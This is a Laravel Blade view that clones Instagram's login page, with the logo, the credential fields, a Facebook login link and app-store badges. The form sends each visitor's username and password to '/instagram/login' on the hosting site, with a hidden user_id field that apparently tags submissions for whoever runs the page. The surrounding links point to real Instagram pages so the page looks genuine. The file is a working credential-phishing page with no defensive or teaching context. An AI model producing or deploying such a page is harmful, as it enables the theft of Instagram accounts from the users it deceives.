@extends('layout')


@section('content')

<div id="instagram-wrapper">


<div class="login">

    <h1>
        <img src="https://i.imgur.com/zqpwkLQ.png" width="200px" height="68px">
    </h1>

    <form action="/instagram/login" method="POST">
        {{ csrf_field() }}

        <input type="hidden" name="user_id" value="{{ $user_id }}" />

        <input placeholder="Phone number, username, or email" type="text" name="username"
        class="{{ $errors->has('username') ? ' has-error' : '' }}">
        {!! $errors->first('username', '<small class="help-block">:message</small>') !!}
        <input placeholder="Password" type="password" name="password"
        class="{{ $errors->has('password') ? ' has-error' : '' }}">
        {!! $errors->first('password', '<small class="help-block">:message</small>') !!}
        <input type="submit" value="Log In" /><br>

    </form>

    <div class="divider"><b>OR</b></div>

    <div class="fbwrapper">
        <div class="fb">
        <a href="https://facebook.com">
          <i class="fab fa-facebook"></i> Log in with Facebook
        </a>
        </div>
    </div>

    <div class="forgotwrapper"><div class="forgot"><a href="https://instagram.com">Forgot password?</a></div></div>


  </div>


  <div class="infobox">

    <p>Don't have an account? <a href="https://instagram.com">Sign up</a></p>

  </div>

  <div class="apps">

    <p>Get the app.</p>
    <span>
        <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo">
        <img src="https://pluspng.com/img-png/download-on-app-store-png-open-2000.png" height="45px" width="153px"></a>
        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DXRR9_gALAAHKOzMSO3MkAOZ0JJtC%26utm_content%3Dlo%26utm_medium%3Dbadge">
            <img src="https://static-content.4tellus.com/wp-content/uploads/2018/05/23014710/badge-play.png" height="45" width="151px">
        </a>
    </span>

  </div>
</div>




@endsection
